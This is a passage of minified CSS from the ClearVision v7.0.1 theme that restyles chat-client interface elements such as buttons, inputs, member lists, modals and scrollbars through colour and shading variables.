l/0.8)}.lookOutlined__201d5.colorRed__201d5{background-color:rgba(0,0,0,0);border-color:var(--hsl-danger-color);color:var(--button-outline-brand-text)}.lookOutlined__201d5.colorRed__201d5:hover{border-color:hsl(from var(--hsl-danger-color) h s l/0.8);background-color:hsl(from var(--hsl-danger-color) h s l/0.8);color:var(--button-outline-brand-text)}.lookLink__201d5 .contents__201d5{background:none}.lookLink__201d5:hover .contents__201d5{text-decoration:underline}:is(.theme-light,.theme-dark) .lookLink__201d5:is(.colorPrimary__201d5,.colorLink__201d5){color:var(--hsl-main-color)}.lookLink__201d5.colorBrand__201d5{color:var(--hsl-main-color)}.lookLink__201d5.colorRed__201d5{color:var(--hsl-danger-color)}/*! ClearVision v7.0.1 by ClearVision Team */.checkbox_f525d3{border-radius:4px}.checkbox_f525d3.checked_f525d3{border-color:var(--hsl-main-color);background-color:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.input__0f084{background:var(--hsl-input-shading);border-color:var(--hsl-input-border-shading)}.input__0f084::-moz-placeholder{color:var(--text-muted)}.input__0f084::placeholder{color:var(--text-muted)}.input__0f084:focus,.input__0f084.focused__0f084{border-color:var(--hsl-main-color);box-shadow:0 0 2px 0 var(--hsl-main-color)}.input__0f084.inputField_d64f22{border:none;background:none}.input__0f084 .multiInputField_b404ff{background:rgba(0,0,0,0)}.copyInput_cedfaf .input__0f084{background:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.item__001a7[aria-checked=true]{background-color:rgba(0,0,0,0)}.refreshIconStroke__001a7{r:10 !important;stroke:var(--interactive-active)}.refreshIcon__001a7{fill:var(--interactive-active)}.radioIndicatorChecked__001a7{color:var(--interactive-active)}.radioIndicatorChecked__001a7 .refreshIconFill__001a7{fill:none}.radioIndicatorChecked__001a7 .refreshIconStroke__001a7{stroke:var(--interactive-active)}.radioBar__001a7{background-color:var(--hsl-card-shading);transition:all .1s ease}.radioBar__001a7:hover{box-shadow:inset 0 0 0 2px var(--radio-bar-accent-color, var(--hsl-hover-color))}.item__001a7[aria-checked=true] .radioBar__001a7{background-color:var(--radio-bar-accent-color, var(--hsl-main-color))}/*! ClearVision v7.0.1 by ClearVision Team */.slider_a562c8 .bar_a562c8,.slider_a562c8 .markDash_a562c8{background:var(--hsl-card-shading)}.slider_a562c8 .barFill_a562c8{background:var(--hsl-main-color)}.slider_a562c8 .grabber_a562c8{filter:drop-shadow(0 0 3px var(--hsl-main-color))}/*! ClearVision v7.0.1 by ClearVision Team */.container__87bf1{background:hsl(from var(--interactive-normal) h s l/0.2) !important}.container__87bf1.checked__87bf1{background:var(--hsl-main-color) !important}.container__87bf1.checked__87bf1 path{fill:var(--hsl-main-color)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .top_b3f026 .item_b3f026{--selected-tab-item-color: var(--hsl-hover-color)}.visual-refresh .top_b3f026 .item_b3f026.selected_b3f026{--selected-tab-item-color: var(--hsl-main-color);color:var(--interactive-active)}.visual-refresh :is(.topPill_b3f026,.side_b3f026) .themed_b3f026.item_b3f026:hover:not(.disabled_b3f026){background-color:var(--background-modifier-accent)}.visual-refresh :is(.topPill_b3f026,.side_b3f026) .themed_b3f026.item_b3f026.selected_b3f026{background-color:var(--hsl-main-color)}.visual-refresh :is(.topPill_b3f026,.side_b3f026) .themed_b3f026.item_b3f026.selected_b3f026:hover:not(.disabled_b3f026){background-color:var(--hsl-main-color)}.header_b3f026{color:var(--hsl-main-color);display:flex;align-items:center;justify-content:center}.header_b3f026::before{content:"""";height:2px;flex-grow:1;background:linear-gradient(to left, var(--hsl-main-color) 50%, transparent);margin-right:5px}.header_b3f026::after{content:"""";height:2px;flex-grow:1;background:linear-gradient(to right, var(--hsl-main-color) 50%, transparent);margin-left:5px}/*! ClearVision v7.0.1 by ClearVision Team */.container_a45028{background:var(--hsl-input-shading);border-color:var(--hsl-input-border-shading)}.container_a45028:focus-within{border-color:var(--hsl-main-color);box-shadow:0 0 2px 0 var(--hsl-main-color)}.visual-refresh .container_fea832{background:var(--hsl-input-shading);border-color:var(--hsl-input-border-shading)}.visual-refresh .container_fea832:focus-within{border-color:var(--hsl-main-color);box-shadow:0 0 2px 0 var(--hsl-main-color)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh :is(html,body,.appMount__51fd7){background:none}.app_a3002d{background:var(--hsl-background-shading);color:rgba(0,0,0,0)}.app__160d8{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.1))}.visual-refresh .bg__960e4{background:var(--background-image) var(--background-position)/var(--background-size) no-repeat;background-attachment:var(--background-attachment);filter:var(--background-filter);z-index:-1}.visual-refresh .container_a2f514{background:var(--hsl-background-shading)}.wanderingCubes__0b5bb .item__0b5bb{background:var(--hsl-main-color)}.path__0b5bb{stroke:var(--hsl-main-color)}.focus-rings-ring{box-shadow:0 0 0 4px var(--focus-color)}/*! ClearVision v7.0.1 by ClearVision Team */::-moz-placeholder{font-family:var(--main-font)}body,button,input,select,textarea,::placeholder{font-family:var(--main-font)}code{font-family:var(--code-font)}::-moz-selection{background:var(--hsl-main-color);color:var(--text-normal)}::selection{background:var(--hsl-main-color);color:var(--text-normal)}/*! ClearVision v7.0.1 by ClearVision Team */.bar_c38106{background-color:rgba(0,0,0,0);padding-left:0}.leading_c38106{gap:0;margin:0 6px}/*! ClearVision v7.0.1 by ClearVision Team */.notice__6e2b9{border-radius:4px;background:hsl(from var(--custom-notice-background, var(--hsl-main-color)) h s l/0.8)}.colorBrand__6e2b9{--custom-notice-background: var(--hsl-main-color)}.colorDanger__6e2b9{--custom-notice-background: var(--hsl-danger-color)}.colorStreamerMode__6e2b9{--custom-notice-background: var(--hsl-streaming-color)}/*! ClearVision v7.0.1 by ClearVision Team */:is(.auto__99f8c,.auto_d125d2)::-webkit-scrollbar{width:14px}:is(.auto__99f8c,.auto_d125d2)::-webkit-scrollbar-thumb,:is(.auto__99f8c,.auto_d125d2)::-webkit-scrollbar-track{border:3px solid rgba(0,0,0,0);border-radius:7px}:is(.auto__99f8c,.auto_d125d2)::-webkit-scrollbar-track{background:rgba(0,0,0,0)}:is(.thin__99f8c,.thin_d125d2)::-webkit-scrollbar{width:8px}:is(.thin__99f8c,.thin_d125d2)::-webkit-scrollbar-thumb,:is(.thin__99f8c,.thin_d125d2)::-webkit-scrollbar-track{border:3px solid rgba(0,0,0,0);border-radius:5px}:is(:is(.auto__99f8c,.auto_d125d2),:is(.thin__99f8c,.thin_d125d2))::-webkit-scrollbar-thumb{background-color:var(--hsl-main-color)}:is(:is(.auto__99f8c,.auto_d125d2),:is(.thin__99f8c,.thin_d125d2))::-webkit-scrollbar-thumb:active{background-color:var(--hsl-hover-color)}/*! ClearVision v7.0.1 by ClearVision Team */.mediaBarProgress_b26b79,.mediaBarProgress_b26b79::before,.mediaBarProgress_b26b79::after{background:var(--hsl-main-color)}.mediaBarGrabber_b26b79,.mediaBarInteraction_b26b79:hover .mediaBarGrabber_b26b79,.mediaBarInteractionDragging_b26b79 .mediaBarGrabber_b26b79{background:var(--hsl-main-color)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .authBox__921c5{background-color:var(--hsl-modal-shading)}.list__920b8{background-color:var(--background-modifier-accent)}.navRow__86e92{background-color:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.numberBadge__2b1f5,.textBadge__2b1f5{background:var(--hsl-main-color) !important;color:var(--header-primary)}/*! ClearVision v7.0.1 by ClearVision Team */.refresh-fast-follow-guild-bg.visual-refresh .bg__960e4{background:var(--background-image) var(--background-position)/var(--background-size) no-repeat;background-attachment:var(--background-attachment);filter:var(--background-filter);z-index:-1}.refresh-fast-follow-guild-bg.visual-refresh .guilds_c48ade{background:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .chat_f75fb0{background:rgba(0,0,0,0)}.visual-refresh .chat_f75fb0[data-has-border=true]{border:none}.visual-refresh .chat_f75fb0.threadSidebarOpen_f75fb0{border-bottom-right-radius:0}.visual-refresh.theme-midnight .content_f75fb0{border:none}.visual-refresh :is(.chatContent_f75fb0,.scroller__28a87){background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4))}.visual-refresh :is(.wrapper_d852db,.wrapper_fc8177){background-color:rgba(0,0,0,0)}.visual-refresh .wrapper_d852db{animation:cv-card-loading 1.5s infinite ease-in-out}.visual-refresh .wrapper_f7ecac{background-color:var(--hsl-popout-shading);border-color:var(--hsl-popout-shading);box-shadow:none}.noChannel__01d5c{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4))}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .form_f75fb0{margin-top:4px}.visual-refresh .channelTextArea__74017{background-color:var(--hsl-input-shading);box-shadow:0 0 0 2px var(--hsl-input-border-shading);border-color:rgba(0,0,0,0)}.visual-refresh .channelTextArea__74017:focus-within{border-color:rgba(0,0,0,0);box-shadow:0 0 2px 2px var(--hsl-main-color)}.visual-refresh .stackedBars__74017,.visual-refresh .channelAttachmentArea_b77158{background:rgba(0,0,0,0)}.visual-refresh .upload_aa605f{background:var(--hsl-card-shading);border:none}.threadSuggestionBar__841c8,.themedBackground__74017{background:rgba(0,0,0,0)}.scrollableContainer__74017::-webkit-scrollbar-thumb{background-color:var(--hsl-main-color)}.visual-refresh :is(.inlineCode_ada32f,.after_inlineCode_ada32f,.before_inlineCode_ada32f){background:hsl(from var(--hsl-card-shading) h s calc(100 - l)/calc(alpha * 0.5))}.activeButtonChild_aa63ab{color:var(--interactive-normal)}:is(.theme-light,.theme-dark) .button_aa63ab:is(:focus,:focus-within,:hover) .activeButtonChild_aa63ab{color:var(--interactive-active)}.toolbar_bba883{background-color:var(--hsl-popout-shading)}.toolbar_bba883::before{border-top-color:var(--hsl-popout-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .wrapper_cb9592,.visual-refresh .channelChatWrapper_cb9592{background:rgba(0,0,0,0)}.visual-refresh .callContainer_cb9592{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4));border:none}.visual-refresh .root_bfe55a{background:rgba(0,0,0,0)}.gradientBackground__11664{background:none}.sphere__11664{background:none;border:none;animation:none}.buttonSection__1405b.experimentButtonSection__1405b{background:var(--hsl-popout-shading);border:none;border-radius:4px}.colorable_f1ceac.disconnect_f1ceac{background:var(--hsl-danger-color)}.border__2f4f7.speaking__2f4f7{box-shadow:inset 0 0 0 2px var(--hsl-main-color)}.wrapper_cb9592.minimum_cb9592 .callContainer_cb9592{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.6))}.quickSelectPopout_ebaca5{background:var(--hsl-popout-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.divider__908e2{--divider-color: var(--hsl-main-color)}.divider__908e2.hasContent__908e2{border-color:rgba(0,0,0,0)}.visual-refresh .content__908e2{display:flex;flex:1;background-color:rgba(0,0,0,0);align-items:center;font-weight:700}.content__908e2::before,.content__908e2::after{content:"""";height:1px;flex-grow:1;background:var(--background-modifier-accent)}.content__908e2::before{margin-right:10px}.content__908e2::after{margin-left:10px}.isUnread__908e2 .content__908e2::before,.isUnread__908e2 .content__908e2::after{background:var(--divider-color)}/*! ClearVision v7.0.1 by ClearVision Team */.avatar_c19a55{transition:all .3s ease-in-out,transform .1s ease-in-out}.avatar_c19a55.clickable_c19a55:active{transform:scale(0.9)}.botTagRegular__82f07{background:var(--hsl-main-color);color:var(--header-primary)}.operations_bab751 a{color:var(--hsl-main-color)}.content__235ca a{color:var(--text-link)}.visual-refresh .markup__75297 code{background:var(--hsl-card-shading);border:1px solid var(--hsl-card-shading-inverted)}.visual-refresh .markup__75297 code.inline{border:none;background:hsl(from var(--hsl-card-shading) h s calc(100 - l)/calc(alpha * 0.5));padding:2px 6px}.repliedMessageClickableSpine_c19a55{border-color:var(--hsl-main-color)}.repliedMessageClickableSpine_c19a55:hover,.repliedMessageClickableSpine_c19a55.repliedMessageContentHovered_c19a55{border-color:var(--hsl-hover-color)}.repliedTextPreview_c19a55{color:var(--text-normal);opacity:.7}.repliedTextPreview_c19a55 .clickable_c19a55:hover,.repliedTextPreview_c19a55 .repliedMessageClickableSpineHovered_c19a55{opacity:1}.messageSpine_c19a55::before{border-color:var(--hsl-main-color)}.executedCommand_c19a55 .appLauncherOnboardingCommandName_c19a55{color:var(--hsl-main-color);background:rgba(0,0,0,0)}.executedCommand_c19a55 .appLauncherOnboardingCommandName_c19a55:hover{color:var(--hsl-hover-color);background:rgba(0,0,0,0)}.replying__5126c{--background-mentioned: hsl(from var(--hsl-main-color) h s l/.1);--background-mentioned-hover: hsl(from var(--hsl-hover-color) h s l/.1);background:var(--background-mentioned)}.replying__5126c:hover,.replying__5126c .selected__5126c{background:var(--background-mentioned-hover) !important}.replying__5126c::before{background:var(--hsl-hover-color)}.wrapper_f61d60{background-color:var(--hsl-main-color);color:var(--text-normal);border-radius:5px;padding:0 4px}.wrapper_f61d60:hover{background-color:var(--hsl-hover-color)}.mentioned__5126c{--background-mentioned: hsl(from var(--hsl-main-color) h s l/.1);--background-mentioned-hover: hsl(from var(--hsl-hover-color) h s l/.1)}.mentioned__5126c:before{background-color:var(--hsl-main-color)}.blockquoteContainer__75297 .blockquoteDivider__75297{border-radius:0}.bumpBox_cacd02{background:var(--hsl-card-shading)}.visual-refresh .embedFull__623de{background:var(--hsl-card-shading);border-top:none;border-right:none;border-bottom:none}.visual-refresh .file__0ccae{background:var(--hsl-card-shading);border:none}.visual-refresh .progressBar__89dcd{background:var(--hsl-main-color) !important}.visual-refresh .wrapper_d5f3cd{background:var(--hsl-card-shading);border:none}.visual-refresh .statusOnline_d5f3cd{background:var(--hsl-online-color)}.visual-refresh .statusOffline_d5f3cd{background:var(--hsl-offline-color)}.visual-refresh .guildInviteContainer__083ae{background:var(--hsl-card-shading)}.visual-refresh .footerContent__083ae{background:none}.visual-refresh .tile__72090{background:var(--hsl-card-shading);border:none}.visual-refresh .tile__72090:hover{background:var(--hsl-card-shading)}.visual-refresh .wrapperAudio_cf09d8{background:var(--hsl-card-shading);border:none}.visual-refresh .audioControls_cf09d8{background:rgba(0,0,0,0)}.visual-refresh .wrapper_cf09d8{background:var(--hsl-card-shading)}.visual-refresh .textContainer__4d95d,.visual-refresh .footer__4d95d{background:var(--hsl-card-shading);border:none}.visual-refresh .languageSelector__4d95d{background:var(--hsl-popout-shading)}.visual-refresh .modalTextContainer__4d95d{background:rgba(0,0,0,0);border:none}.visual-refresh .cozy_c19a55.hasThread_c19a55::after{border-color:var(--hsl-main-color)}.visual-refresh .container__9271d{border-color:var(--hsl-main-color)}.visual-refresh .container__9271d{background:var(--hsl-card-shading);border:none}.visual-refresh .cta__9271d{color:var(--hsl-main-color)}.visual-refresh .container_a8e786{background:var(--hsl-card-shading);border:none}.visual-refresh .container_f69538,.visual-refresh .container__0be77{background:var(--hsl-card-shading);border:none}.ripple_a8e786{background:var(--hsl-main-color)}:is(.theme-light,.theme-dark) .container_a8e786:not(.playing_a8e786) .playButtonContainer_a8e786{background:var(--hsl-main-color)}:is(.theme-light,.theme-dark) .container_a8e786:not(.playing_a8e786) .playButtonContainer_a8e786:is(:hover,:active){background:var(--hsl-hover-color)}.playing_a8e786 .playIcon_a8e786{color:var(--hsl-main-color)}.embedCard__44492,.footerContainer__44492{background:var(--hsl-card-shading)}.dot__44492{background:rgba(0,0,0,0)}.hoverButtonGroup__06ab4{background:var(--hsl-popout-shading)}.hoverButton__06ab4.selected__06ab4,.hoverButton__06ab4:hover{background:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .container_f369db{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.3))}.visual-refresh .header_f369db{background:var(--hsl-input-shading);border:2px solid var(--hsl-input-border-shading)}.visual-refresh .header_f369db .input__0f084{background:none;box-shadow:none}.visual-refresh .visual-refresh .headerWithMatchingPosts_f369db{border-bottom:none;border-color:var(--hsl-main-color)}.visual-refresh .visual-refresh .matchingPostsRow_f369db{background:var(--hsl-input-shading);border:2px solid var(--hsl-input-border-shading);border-top:1px solid var(--border-subtle)}.visual-refresh .container_ca49a1{background:var(--hsl-card-shading);border:none}.visual-refresh .descriptionContainer_ca49a1,.visual-refresh .gradient_ca49a1,.visual-refresh .linkContainer_ca49a1{background:rgba(0,0,0,0)}.visual-refresh .pill_a2c9e8{background:var(--hsl-card-shading);border-color:var(--hsl-main-color);transition:all .2s ease}.visual-refresh .pill_a2c9e8.clickable_a2c9e8:not(.disabled_a2c9e8):hover{background:var(--hsl-card-shading);border-color:var(--hsl-hover-color)}.visual-refresh .pill_a2c9e8.selected_a2c9e8{background:var(--hsl-main-color);border-color:var(--hsl-main-color);color:var(--interactive-active)}.visual-refresh .pill_a2c9e8.selected_a2c9e8:not(.disabled_a2c9e8):hover{background:var(--hsl-hover-color);border-color:var(--hsl-hover-color)}.visual-refresh .pill_a2c9e8 .container_f8b2d2{background:rgba(0,0,0,0);border:none}.visual-refresh .newPostsButton_f369db{background:var(--hsl-popout-shading);border-color:rgba(0,0,0,0)}.visual-refresh :is(.container__9a337,.container_faa96b){background:var(--hsl-card-shading);border:2px solid rgba(0,0,0,0)}.visual-refresh :is(.container__9a337,.container_faa96b):hover{background:var(--hsl-card-shading);border-color:var(--hsl-hover-color)}.visual-refresh :is(.container__9a337,.container_faa96b):is(.isOpen__9a337,.isOpen_faa96b){background:var(--hsl-card-shading);border-color:var(--hsl-main-color)}.contentPreview__9a337{background:var(--hsl-card-shading);border:none}.pinIcon__08166{background:var(--hsl-main-color)}.visual-refresh .divider_ee23ac{background:rgba(0,0,0,0)}.visual-refresh .iconWrapper__7e6bb{background:var(--hsl-main-color)}.visual-refresh .icon__7e6bb path{fill:var(--header-primary)}.visual-refresh .container__34c2c{background:rgba(0,0,0,0);border:none}.visual-refresh .active__34c2c{color:var(--hsl-main-color)}.container__93db4{background:rgba(0,0,0,0)}.icon__93db4{background:var(--hsl-main-color);color:var(--header-primary)}.cta__93db4{color:var(--hsl-main-color)}.cta__93db4:hover{color:var(--hsl-hover-color)}.loadingCard_f369db{background:var(--hsl-card-shading);animation:cv-card-loading 1.5s infinite ease-in-out}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .resizeHandle__01ae2{background:rgba(0,0,0,0)}.visual-refresh .container__01ae2{background:rgba(0,0,0,0);border:none;border-bottom-left-radius:0}.visual-refresh .container__01ae2.floating__01ae2{background:var(--hsl-popout-shading)}.visual-refresh .container_fb64c9{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.5))}.visual-refresh .channelTextArea_fb64c9{margin-bottom:0}.visual-refresh .channelTextAreaInner_fb64c9{background-color:var(--hsl-input-shading);box-shadow:0 0 2px 2px var(--hsl-input-border-shading);border-radius:8px}.visual-refresh .channelTextAreaInner_fb64c9:focus-within{box-shadow:0 0 2px 2px var(--hsl-main-color)}.iconWrapper__54b20{background:var(--hsl-main-color)}.icon__54b20 path{fill:var(--header-primary)}.chatHeaderBar_a5700d{background-color:var(--hsl-popout-shading)}.container_a8217b,.header_a8217b{background:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .newMessagesBar__0f481{top:4px;right:8px;background:hsl(from var(--hsl-main-color) h s l/0.9);border-radius:4px;transition:all .1s ease-in-out}.visual-refresh .newMessagesBar__0f481:active{padding-top:0;scale:.99}.visual-refresh .jumpToPresentBar__0f481{background:var(--hsl-popout-shading);border:none;border-radius:5px}.visual-refresh .messagesErrorBar__0f481{background:var(--hsl-danger-color);border:none;border-radius:5px}.visual-refresh .wrapper__44df5{background:var(--hsl-popout-shading);border:none}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .reactions__23977{border-radius:4px}.visual-refresh .reactions__23977 .reactionMe__23977{background:hsl(from var(--hsl-main-color) h s l/0.15);border-color:var(--hsl-main-color)}.visual-refresh .reactions__23977 .reactionMe__23977 .reactionCount__23977{color:var(--interactive-active)}.visual-refresh :is(.reaction__23977,.reactionBtn__23977):hover{border:1px solid var(--hsl-hover-color)}.reactionTooltip_b49891{background:var(--hsl-popout-shading)}:is(.theme-light,.theme-dark) .reactionEmojiDetailsClickable_d5cd2d{background:var(--hsl-main-color)}:is(.theme-light,.theme-dark) .reactionEmojiDetailsClickable_d5cd2d:hover{background:var(--hsl-hover-color)}.burstGlow__23977{border-radius:4px}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .searchResultsWrap_a9e706{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.3));border:none}.visual-refresh .searchHeader_f3b986{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.4))}.visual-refresh .searchResult__02a39{background:var(--hsl-card-shading);border:none}.visual-refresh .button__02a39{background:var(--hsl-main-color)}.visual-refresh .button__02a39:hover{background:var(--hsl-hover-color);color:var(--interactive-active)}/*! ClearVision v7.0.1 by ClearVision Team */:is(.theme-dark,.theme-light) .themed__9293f{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.5))}:is(.theme-dark,.theme-light) .dot__9293f{display:none}.children__9293f::after{display:none}.akaBadge__488b1{background:var(--hsl-main-color)}.visual-refresh .searchBar__97492{background-color:var(--hsl-input-shading);border-color:var(--hsl-input-border-shading)}.visual-refresh .searchBar__97492:focus-within{border-color:var(--hsl-main-color);box-shadow:0 0 2px 0 var(--hsl-main-color)}.visual-refresh .searchFilter_bd8186,.visual-refresh .searchAnswer_bd8186{background:var(--hsl-main-color)}.visual-refresh .searchFilter_bd8186{border-top-right-radius:0;border-bottom-right-radius:0}.visual-refresh .searchAnswer_bd8186{border-top-left-radius:0;border-bottom-left-radius:0}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .container_c8ffbb{background:none;border:none}.visual-refresh .membersWrap_c8ffbb{background:none;border:none;height:100%}.members_c8ffbb{background:hsl(from var(--hsl-background-shading) h s l/calc(var(--background-shading-percent) * 0.3))}.mulitplePlaceholderUsername__27cc6,.placeholderAvatar__27cc6,.placeholderUsername__27cc6{background:var(--hsl-card-shading)}.membersGroup_c8ffbb{display:flex;color:var(--hsl-main-color);font-weight:700;align-items:center}.membersGroup_c8ffbb:before{content:"""";height:2px;flex-grow:1;background:linear-gradient(to left, currentColor 50%, transparent);margin-right:5px}.membersGroup_c8ffbb:after{content:"""";height:2px;flex-grow:1;background:linear-gradient(to right, currentColor 50%, transparent);margin-left:5px}.visual-refresh .container__0f2e8{background:var(--hsl-card-shading);border-radius:8px;border-width:2px;padding-left:10px}.selected__0f2e8,.selected__0f2e8:hover{background:var(--hsl-card-shading);border-color:var(--hsl-main-color)}.popoutContentWrapper_af3b89,.interactionsContainer_af3b89{background:var(--hsl-popout-shading)}.interactionsContainerHeader_af3b89{border:none}.member__5d473{background:rgba(0,0,0,0);backface-visibility:hidden}.memberInner__5d473{position:relative;width:100%;transition:all .15s ease-in-out,transform .1s ease-in-out;z-index:1}.memberInner__5d473:active{transform:scale(0.9)}.name__91a9d{width:-moz-fit-content;width:fit-content}.member__5d473 .nameContainer__703b9{position:static;transition:all .15s ease-in-out;z-index:unset}.member__5d473 .nameContainer__703b9:before{content:"""";position:absolute;top:0;right:0;bottom:0;left:0;background:linear-gradient(to right, var(--background-modifier-accent) 90%, transparent);border-radius:3px;opacity:0;transition:all .15s ease-in-out;z-index:-1}.member__5d473 .nameContainer__703b9:after{content:"""";position:absolute;top:0;right:100%;bottom:0;left:0;background:linear-gradient(to right, var(--hsl-main-color) 90%, transparent);border-radius:3px;opacity:.8;transition:all .3s ease-in-out;z-index:-1}.member__5d473 .nameContainer__703b9[style^=""color:""]:before,.member__5d473 .nameContainer__703b9[style^=""color:""]:after{background:linear-gradient(to right, currentColor 90%, transparent)}.nameplated__91a9d .member__5d473 .nameContainer__703b9[style^=""color:""]:before,.nameplated__91a9d .member__5d473 .nameContainer__703b9[style^=""color:""]:after{background:linear-gradient(to right, currentColor, transparent)}.truncated_c9d15c{color:var(--text-muted);transition:all .15s ease-in-out}.truncated_c9d15c strong{color:var(--hsl-main-color);font-weight:700;transition:all .15s ease-in-out}.member__5d473:hover .childContainer__91a9d{background:rgba(0,0,0,0)}.member__5d473:hover .nameContainer__703b9:before{opacity:1}.member__5d473:hover .nameContainer__703b9[style^=""color:""]:before{opacity:.07}.selected__91a9d .childContainer__91a9d{background-color:rgba(0,0,0,0)}.selected__91a9d .nameContainer__703b9{-webkit-text-fill-color:var(--interactive-active);text-shadow:0 0 3px rgba(0,0,0,.7)}.selected__91a9d .nameContainer__703b9:after{right:0}.selected__91a9d .truncated_c9d15c,.selected__91a9d strong{color:var(--interactive-active);text-shadow:0 0 3px rgba(0,0,0,.7)}.selected__91a9d .ownerIcon__5d473{filter:drop-shadow(0 0 3px rgba(0, 0, 0, 0.7))}.container__4413f{background:var(--hsl-popout-shading)}.ctaButton__4413f{background:var(--hsl-main-color);border:none}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .root__49fc1{background:var(--hsl-modal-shading);border:none;box-shadow:none}.header__49fc1,.content__49fc1,.footer__49fc1{background:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.container_eb2cd2{border:2px solid rgba(0,0,0,0);background:var(--background-modifier-accent)}.container_eb2cd2:hover{border-color:var(--hsl-hover-color)}.iconContainer__98cf7 circle{fill:var(--hsl-main-color)}.rowContainer__991a0{border:2px solid rgba(0,0,0,0);background:var(--background-modifier-accent)}.rowContainer__991a0:hover{border-color:var(--hsl-hover-color);background:var(--background-modifier-accent)}/*! ClearVision v7.0.1 by ClearVision Team */.keyboardShortcutsModal_f061f6,.keybindGroup_f061f6{background:var(--hsl-modal-shading)}.combo_fcddc1 .key_fcddc1{border-color:var(--hsl-hover-color);box-shadow:inset 0 -4px var(--hsl-hover-color)}.combo_fcddc1 .key_fcddc1:active{border-color:var(--hsl-main-color);box-shadow:inset 0 -2px var(--hsl-main-color)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .quickswitcher_ac6cb0{background:var(--hsl-popout-shading);border:none;background:var(--hsl-input-shading)}.visual-refresh .scroller_ac6cb0{background:rgba(0,0,0,0)}.visual-refresh .input_ac6cb0{border:2px solid var(--hsl-input-border-shading)}.visual-refresh .input_ac6cb0:focus-within{border-color:var(--hsl-main-color);box-shadow:0 0 2px 0 var(--hsl-main-color)}.scroller_ac6cb0::-webkit-scrollbar{width:10px}.scroller_ac6cb0::-webkit-scrollbar-track{background:rgba(0,0,0,0) !important}.result__71961[aria-selected=true]{background:var(--hsl-hover-color)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh :is(.scroller_cc2dff,.reactors_cc2dff){background:rgba(0,0,0,0)}.visual-refresh .reactionSelected_cc2dff{border:1px solid var(--hsl-main-color)}/*! ClearVision v7.0.1 by ClearVision Team */.pillContainer__9e06a{background:var(--background-modifier-accent)}.pillItemSelected__9e06a{background:var(--hsl-main-color)}.source_febe19:hover:not(.selectedSource_febe1) .sourcePreviewContainer_febe19:before{border-color:var(--hsl-main-color)}/*! ClearVision v7.0.1 by ClearVision Team */.spinner_ca0af2{background:rgba(0,0,0,0)}.customGiftBoxHighlighted_d50aac{border-color:var(--hsl-main-color)}.iconBackground__33980{background:var(--hsl-main-color);color:var(--header-primary)}.visual-refresh .selectionBox_b13085{background:var(--background-modifier-accent);outline:none}.visual-refresh .selectedPlan_b13085{background:var(--background-modifier-accent);outline:2px solid var(--hsl-main-color)}.visual-refresh .previewContainerSelected__50f14{background:var(--background-modifier-accent);outline:2px solid var(--hsl-main-color);border:none}.customGiftMessage_bf1b4a{background:rgba(0,0,0,0)}.wrapper__4106a{background:rgba(0,0,0,0)}.cardInput__8b579{background-color:var(--hsl-input-shading);border-color:var(--hsl-input-border-shading)}.cardInputFocused__8b579{border-color:var(--hsl-main-color);box-shadow:0 0 2px 0 var(--hsl-main-color)}.content_a8c622,.upsellFooter__5e07c{background:rgba(0,0,0,0)}:is(.theme-light,.theme-dark) .iconWrapper__96f95{background:var(--background-modifier-accent)}.value__96f95,.value__96f95:focus{box-shadow:none}/*! ClearVision v7.0.1 by ClearVision Team */.uploadDropModal_dbca3c .bgScale_dbca3c{background:var(--hsl-main-color)}.uploadDropModal_dbca3c .inner_dbca3c{border-color:var(--header-primary)}/*! ClearVision v7.0.1 by ClearVision Team */.selectorButton__0907c{background:var(--background-modifier-accent)}:is(.theme-light,.theme-dark) .item__3d4a0{border-color:var(--hsl-main-color)}.selectorButtonSelected__0907c{background:var(--hsl-main-color)}.visual-refresh .radioItemStyles__837b7{background:rgba(0,0,0,0)}.visual-refresh .banReasonOtherClickable__837b7{background:var(--background-modifier-accent)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh .modal__9a792{background:var(--hsl-modal-shading) !important}.visual-refresh .browser__9a792{background:rgba(0,0,0,0)}/*! ClearVision v7.0.1 by ClearVision Team */.pillIconOnline__921c5{background:var(--hsl-online-color)}.visual-refresh .editProfileContainer__42179{background:var(--hsl-popout-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.visual-refresh :is(.actionButtons_cc1819,.closeButton__6088c){background:var(--hsl-modal-shading)}/*! ClearVision v7.0.1 by ClearVision Team */.scroller__6fd0e{background:rgba(0,0,0,0)}.headerWave__1dfae{background:rgba(0,0,0,0);color:rgba(0,0,0,0)}.bodyWave__1dfae{display:none}.topPerksCard__3add8,.card__4d7bb,.wrapper__5b98e{background:var(--hsl-card-shading)}.innerWrapper_b4589b{background:var(--hsl-popout-shading)}/*! ClearVision 